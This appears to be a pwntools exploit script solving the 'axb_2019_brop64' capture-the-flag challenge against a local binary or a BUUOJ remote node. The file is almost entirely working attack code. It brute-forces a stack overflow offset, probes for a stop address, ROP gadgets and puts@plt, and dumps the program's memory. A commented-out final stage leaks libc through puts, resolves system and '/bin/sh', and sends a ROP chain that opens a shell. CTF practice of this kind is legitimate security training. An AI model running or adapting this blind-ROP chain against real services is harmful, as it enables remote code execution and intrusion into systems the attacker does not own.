#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *


debug = 1
elf = ELF('./axb_2019_brop64')
rop = ROP('./axb_2019_brop64')

def get_process():
    if debug:
        return process('./axb_2019_brop64')
    else:
        return remote('node5.buuoj.cn', 26698)

def getsize():
    cnt = 1
    while 1:
        try:

            p = get_process()
            p.recvuntil(b"Please tell me:")
            payload = b'A' * cnt
            p.sendline(payload)
            data = p.recvall()
            p.close()
            if b'Goodbye' not in data:
                return cnt
            else:
                cnt += 1
                # print("Trying offset: " + str(cnt))
        except EOFError:
            p.close()
            print("Success, EOFError, buffer offset is " + str(cnt))
            return cnt


def get_stop(size):
    addr = 0x4007d0
    while 1:
        addr += 1
        try:
            print("Trying addr: 0x%x"%addr)
            p = get_process()
            p.recvuntil(b"Please tell me:")
            payload = b'A' * size + p64(addr)
            p.sendline(payload)
            data = p.recvall(timeout=10)
            p.close()
            print(data)
            if b'Hello' in data:
                return addr
        except EOFError:
            p.close()
            print("find one bad addr : 0x%x"%(addr))
        except:
            p.close()
            print("Can't connect, retrying...")


def find_gadget(size, stop_addr, addr):
    try:
        p = get_process()
        p.recvuntil(b"Please tell me:")
        payload = b'A' * size + p64(addr) + p64(0) * 6 + p64(stop_addr) + p64(0) * 10
        p.sendline(payload)
        data = p.recv()
        p.close()
        if b"Hello" not in data:
            return False
        return True
    except Exception:
        p.close()
        return False


def get_gadget(size, stop_addr):
    addr = 0x400850
    # f = open('brop.txt', 'w')
    while 1:
        if find_gadget(size, stop_addr, addr):
            # if check_gadget(size, addr):
            # f.write("0x%x"%addr + '\n')
            return addr
        addr += 1
    # f.close()
    # return addr

def get_plt_puts(size, rdi_ret, stop_addr):
    addr = 0x400600
    while 1:
        p = get_process()
        p.recvuntil(b"Please tell me:")
        payload = b'A' * size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_addr)
        p.sendline(payload)

        try:
            data = p.recv()
            if b'ELF' in data:
                return addr
            p.close()
            addr += 1
        except Exception:
            p.close()
            addr += 1


def leak(size, rdi_ret, puts_plt, leak_addr, stop_addr):
    p = get_process()
    payload = b'A' * size + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_addr)
    p.recvuntil(b'me:')
    p.sendline(payload)
    p.recvuntil(b'A' * size)
    p.recv(3)
    try:
        data = p.recv()
        p.close()
        try:
            data = data[:data.index(b"\nHello")]
        except Exception:
            data = data
        if data == b"":
            data = b"\x00"
        return data
    except Exception:
        p.close()
        return None

def dump(size, rdi_ret, puts_plt, stop_addr):
    result = b''
    addr = 0x400000
    while addr < 0x401000:
        print(hex(addr))
        data = leak(size, rdi_ret, puts_plt, addr, stop_addr)
        if data is None:
            result += b'\x00'
            addr += 1
            continue
        else:
            result += data
        addr += len(data)
    with open('dump', 'wb') as f:
        f.write(result)



# size = getsize()
# print("Success, buffer offset is " + str(size))

size = 216
stop_addr = get_stop(size)
print("Success, main addr is 0x%x"%(stop_addr))

# pop_gadget_addr = get_gadget(size, stop_addr)
# print("success gadget: 0x%x"%pop_gadget_addr)

# rdi_gadget_addr = pop_gadget_addr + 0x9

# puts_plt_addr = get_plt_puts(size, rdi_gadget_addr, stop_addr)
# print("find puts@plt addr: 0x%x" % puts_plt_addr)

# dump(size, rdi_gadget_addr, puts_plt_addr, stop_addr)

# size = 216
# stop_addr = 0x4007d6
# pop_gadget_addr = 0x40095a
# rdi_gadget_addr = pop_gadget_addr + 0x9
# puts_plt_addr = 0x400635
# puts_got_addr = 0x601018

# payload = b'A' * size + p64(rdi_gadget_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(stop_addr)
# p = get_process()


# # context.terminal = ['tmux','splitw','-h']
# # context.log_level='debug'
# # gdb.attach(p)

# p.recvuntil(b'me:')
# p.sendline(payload)
# puts_real_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
# print(hex(puts_real_addr))


# libc = LibcSearcher('puts', puts_real_addr)
# libc_base = puts_real_addr - libc.dump('puts')
# sys_addr = libc_base + libc.dump('system')
# sh_addr = libc_base + libc.dump('str_bin_sh')
# ret_addr = rop.find_gadget(['ret'])[0]

# # libc_base = 0x7ff5f8cda000
# # sys_addr = 0x7ff5f8d2ad70
# # sh_addr = 0x7ff5f8eb2678
# # ret_addr = 0x400629
# print(hex(libc_base))
# print(hex(sys_addr))
# print(hex(sh_addr))
# print(hex(ret_addr))

# payload = b'A' * size
# payload += p64(rdi_gadget_addr)
# payload += p64(sh_addr)
# payload += p64(sys_addr)
# payload += p64(stop_addr)

# p.recvuntil(b'me:')
# p.sendline(payload)
# print(p.recv())
# p.interactive()
